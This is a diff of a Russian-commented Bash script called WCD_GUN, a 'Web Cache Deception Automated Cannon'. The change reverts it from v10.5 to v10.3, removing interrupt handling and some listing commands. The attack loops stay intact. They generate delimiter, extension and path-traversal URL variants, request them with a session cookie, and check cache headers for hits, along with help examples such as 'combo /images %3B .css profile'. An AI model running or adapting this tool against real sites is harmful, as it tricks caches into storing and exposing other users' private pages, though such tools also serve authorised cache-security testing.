@@ -1,7 +1,8 @@
 #!/bin/bash
 # =============================================================================
-# WCD_GUN v10.5 — Web Cache Deception Automated Cannon
-# Исправлено: Ctrl+C останавливает burst/fire и возвращает в меню.
+# WCD_GUN v10.3 — Web Cache Deception Automated Cannon
+# Исправлено: --noproxy '*' в do_curl, set -euo pipefail убран,
+# load_magazine не возвращает 1, fire() без mapfile, confirm_cache_status без C-цикла.
 # =============================================================================
 
 set +euo pipefail
@@ -38,14 +39,12 @@ die() {
 }
 
 # -----------------------------------------------------------------------------
-# Глобальные переменные
+# Глобальные переменные (инициализируются позже)
 # -----------------------------------------------------------------------------
 LOG_FILE=""
 SUCCESS_LOG=""
 RAM_DIR=""
-VERSION="10.5"
-INTERRUPTED=false
-SHOULD_QUIT=false
+VERSION="10.3"
 
 # -----------------------------------------------------------------------------
 # Логирование
@@ -450,7 +449,6 @@ set_cookie() {
 # Атакующие функции
 # -----------------------------------------------------------------------------
 single_shot() {
-    $INTERRUPTED && return 1
     local crafted_path="$1"
     [[ -z "$crafted_path" ]] && { print_red "[!] Не указан путь"; return 1; }
     local full_url
@@ -503,15 +501,10 @@ burst_attack() {
     echo -e "Комбинаций: ${CYAN}$total${NC}" >&2
     [[ $total -eq 0 ]] && { print_red "[!] Нет комбинаций"; return 1; }
     local shots=0 hits=0
-    INTERRUPTED=false
     while IFS= read -r endpoint; do
-        $INTERRUPTED && break
         while IFS= read -r staticdir; do
-            $INTERRUPTED && break
             while IFS= read -r delimiter; do
-                $INTERRUPTED && break
                 while IFS= read -r extension; do
-                    $INTERRUPTED && break
                     ((shots++)); local path="${staticdir}/../${endpoint}${delimiter}${extension}"; path=$(echo "$path" | sed 's/\/\//\//g')
                     printf "[%d/%d] %s ... " "$shots" "$total" "$path" >&2
                     do_curl "http://${TARGET_HOST}${path}" "-s" "-o" "/dev/null" "-b" "$COOKIE_FILE" >/dev/null 2>&1; sleep 0.1
@@ -524,8 +517,6 @@ burst_attack() {
         done < "$RAM_DIR/burst_staticdirs.txt"
     done < "$RAM_DIR/burst_endpoints.txt"
     echo "" >&2; print_green "Хитов: $hits из $shots"
-    $INTERRUPTED && print_yellow "[*] Прервано пользователем."
-    INTERRUPTED=false
 }
 
 fire() {
@@ -537,21 +528,14 @@ fire() {
     local total=$((${#delims[@]} * ${#exts[@]}))
     [[ $total -eq 0 ]] && { print_red "[!] Нет комбинаций для fire"; return 1; }
     local shots=0 hits=0
-    INTERRUPTED=false
-    for d in "${delims[@]}"; do
-        $INTERRUPTED && break
-        for e in "${exts[@]}"; do
-            $INTERRUPTED && break
-            ((shots++)); local path="/${d}test${e}"; printf "[%d/%d] %s ... " "$shots" "$total" "$path" >&2
-            do_curl "http://${TARGET_HOST}${path}" "-s" "-o" "/dev/null" "-b" "$COOKIE_FILE" >/dev/null 2>&1; sleep 0.1
-            local hdr="$RAM_DIR/hdr_$$.txt"; do_curl "http://${TARGET_HOST}${path}" "-s" "-o" "/dev/null" "-D" "$hdr" >/dev/null 2>&1
-            detect_cache_status "$hdr"
-            [[ "$CACHE_LEVEL" == "HIT_STRONG" || "$CACHE_LEVEL" == "HIT_WEAK" ]] && { print_green " HIT!"; ((hits++)); } || echo -e "${DIM}MISS${NC}" >&2
-        done
-    done
+    for d in "${delims[@]}"; do for e in "${exts[@]}"; do
+        ((shots++)); local path="/${d}test${e}"; printf "[%d/%d] %s ... " "$shots" "$total" "$path" >&2
+        do_curl "http://${TARGET_HOST}${path}" "-s" "-o" "/dev/null" "-b" "$COOKIE_FILE" >/dev/null 2>&1; sleep 0.1
+        local hdr="$RAM_DIR/hdr_$$.txt"; do_curl "http://${TARGET_HOST}${path}" "-s" "-o" "/dev/null" "-D" "$hdr" >/dev/null 2>&1
+        detect_cache_status "$hdr"
+        [[ "$CACHE_LEVEL" == "HIT_STRONG" || "$CACHE_LEVEL" == "HIT_WEAK" ]] && { print_green " HIT!"; ((hits++)); } || echo -e "${DIM}MISS${NC}" >&2
+    done; done
     echo "" >&2; print_green "Хитов: $hits из $shots"
-    $INTERRUPTED && print_yellow "[*] Прервано пользователем."
-    INTERRUPTED=false
 }
 
 load_magazine_cmd() {
@@ -575,7 +559,7 @@ add_delimiter() {
 }
 
 # -----------------------------------------------------------------------------
-# СТАРТОВЫЙ МАСТЕР
+# СТАРТОВЫЙ МАСТЕР (вызывается командой start)
 # -----------------------------------------------------------------------------
 start_wizard() {
     echo "" >&2
@@ -592,7 +576,7 @@ start_wizard() {
 }
 
 # -----------------------------------------------------------------------------
-# ИНТЕРФЕЙС
+# ИНТЕРФЕЙС: СТАТУС И ШПАРГАЛКА
 # -----------------------------------------------------------------------------
 show_status() {
     echo "" >&2
@@ -628,55 +612,15 @@ show_quick_help() {
     echo -e "  ${WHITE}burst${NC}               - тотальный перебор" >&2
     echo -e "  ${WHITE}fire${NC}                - быстрый обстрел" >&2
     echo -e "  ${WHITE}proxy on|off${NC}        - управление прокси" >&2
-    echo -e "  ${WHITE}magazines${NC}           - показать обоймы в магазине" >&2
-    echo -e "  ${WHITE}hits${NC}                - показать успешные хиты" >&2
     echo -e "  ${WHITE}show${NC}                - показать обоймы и статус" >&2
     echo -e "  ${WHITE}help${NC}                - полный список команд" >&2
-    echo "" >&2
-}
-
-show_magazines_list() {
-    echo "" >&2
-    print_cyan "═══════════════ ОБОЙМЫ В МАГАЗИНЕ ═══════════════"
-    echo -e "  ${WHITE}Путь:${NC} $MAGAZINE_DIR" >&2
-    echo "" >&2
-    for type in delimiters extensions staticdir endpoints; do
-        echo -e "  ${GREEN}[${type}]${NC}" >&2
-        local found=0
-        for f in "$MAGAZINE_DIR"/*."$type"; do
-            [[ -f "$f" ]] || continue
-            found=1
-            local name=$(basename "$f" ".$type")
-            local lines=$(grep -vc '^\s*$\|^\s*#' "$f" 2>/dev/null || echo 0)
-            echo -e "    ${CYAN}${name}${NC} — ${lines} элементов" >&2
-        done
-        [[ $found -eq 0 ]] && echo -e "    ${DIM}(пусто)${NC}" >&2
-    done
-    echo "" >&2
-}
-
-show_hits_list() {
-    echo "" >&2
-    print_cyan "═══════════════ УСПЕШНЫЕ ХИТЫ ═══════════════"
-    if [[ ! -f "$SUCCESS_LOG" || ! -s "$SUCCESS_LOG" ]]; then
-        print_yellow "[*] Хитов пока нет."
-        echo "" >&2
-        return 0
-    fi
-    local count=$(wc -l < "$SUCCESS_LOG" | tr -d ' ')
-    echo -e "  Всего хитов: ${GREEN}${count}${NC}" >&2
-    echo "" >&2
-    tail -20 "$SUCCESS_LOG" | while IFS= read -r line; do
-        echo -e "  ${DIM}${line}${NC}" >&2
-    done
-    [[ $count -gt 20 ]] && echo -e "  ${DIM}... (показаны последние 20)${NC}" >&2
     echo "" >&2
 }
 
 show_help() {
     cat << 'EOF' >&2
 ╔══════════════════════════════════════════════════╗
-║                WCD GUN v10.5 — СПРАВКА           ║
+║                WCD GUN v10.3 — СПРАВКА           ║
 ╚══════════════════════════════════════════════════╝
 
 КОМАНДЫ:
@@ -691,10 +635,8 @@ show_help() {
   combo <sdir> <d> <e> <ep>  ручная сборка вектора
   burst               полный перебор всех комбинаций
   fire                быстрый перебор только разделителей и расширений
-  load <тип> <имя>    загрузить обойму
+  load <тип> <имя>    загрузить обойму (delimiters, extensions, staticdir, endpoints)
   add <разделитель>   добавить разделитель в текущую обойму
-  magazines           показать все обоймы в магазине
-  hits                показать успешные хиты
   show                показать текущее состояние
   help                эта справка
   quit                выход
@@ -702,33 +644,17 @@ show_help() {
 ПРИМЕРЫ:
   set target example.com
   set cookie "session=abc123"
+  proxy on
   combo /images %3B .css profile
   burst
 EOF
 }
 
 # -----------------------------------------------------------------------------
-# ГЛАВНЫЙ ЦИКЛ
+# ГЛАВНЫЙ ЦИКЛ С НОВЫМ СТАРТОВЫМ ЭКРАНОМ
 # -----------------------------------------------------------------------------
 main() {
     init_environment
-
-    trap 'echo ""; print_yellow "[*] Действие прервано."; INTERRUPTED=true' INT
-
-    if [[ -n "${1:-}" ]]; then
-        if [[ "$1" == http://* || "$1" == https://* ]]; then
-            TARGET_HOST="$1"
-            print_green "[+] Цель из аргумента: $TARGET_HOST"
-        else
-            case "$1" in
-                single) single_shot "$2"; exit ;;
-                combo)  combo_shot "$2" "$3" "$4" "$5"; exit ;;
-                burst)  burst_attack; exit ;;
-                fire)   fire; exit ;;
-                *)      echo "Использование: $0 [URL|single|combo|burst|fire]"; exit 1 ;;
-            esac
-        fi
-    fi
 
     echo ""
     print_cyan "╔════════════════════════════════════════════════════╗"
@@ -736,6 +662,7 @@ main() {
     print_cyan "║        Web Cache Deception Automated Cannon       ║"
     print_cyan "╚════════════════════════════════════════════════════╝"
     echo ""
+
     show_status
     show_quick_help
 
@@ -770,11 +697,9 @@ main() {
             burst)       burst_attack ;;
             fire)        fire ;;
             add)         add_delimiter "$arg1" ;;
-            magazines)   show_magazines_list ;;
-            hits)        show_hits_list ;;
             show)        show_status; show_quick_help ;;
             help|?)      show_help ;;
-            quit|exit)   trap - INT; print_green "Выход."; break ;;
+            quit|exit)   print_green "Выход."; break ;;
             "")          ;;
             *)           print_red "Неизвестная команда: $cmd (введи help)" ;;
         esac
@@ -784,5 +709,6 @@ main() {
 # -----------------------------------------------------------------------------
 # ЗАПУСК
 # -----------------------------------------------------------------------------
-trap cleanup EXIT TERM HUP
-main "$@"
+trap cleanup EXIT INT TERM HUP
+main
+
